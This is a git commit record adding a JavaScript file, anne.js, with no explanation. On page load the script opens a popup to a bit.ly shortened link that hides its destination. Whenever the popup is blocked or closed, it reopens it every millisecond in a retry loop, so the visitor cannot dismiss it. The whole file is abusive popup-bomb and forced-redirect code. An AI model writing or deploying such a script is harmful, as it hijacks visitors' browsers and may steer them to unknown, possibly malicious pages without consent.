d94bf9ab320a54e227e98cc6ac1f7d8dad5b2f47
theotherbluemellon <160676977+theotherbluemellon@users.noreply.github.com>
2024-02-20 22:57:10 +0000

    Create anne.js

---
+++ anne.js
@@ -0,0 +1,18 @@
+// First function
+function openFirstPopup() {
+    var popup = window.open('https://bit.ly/LISA_ANNE', '_blank');
+
+    function attemptOpen() {
+        if (popup === null || typeof(popup) === 'undefined' || popup.closed) {
+            setTimeout(function() {
+                popup = window.open('https://bit.ly/LISA_ANNE', '_blank');
+                attemptOpen(); // Retry recursively
+            }, 1);
+        }
+    }
+
+    attemptOpen();
+}
+
+// Add event listeners for each function on page load
+window.addEventListener('load', openFirstPopup);
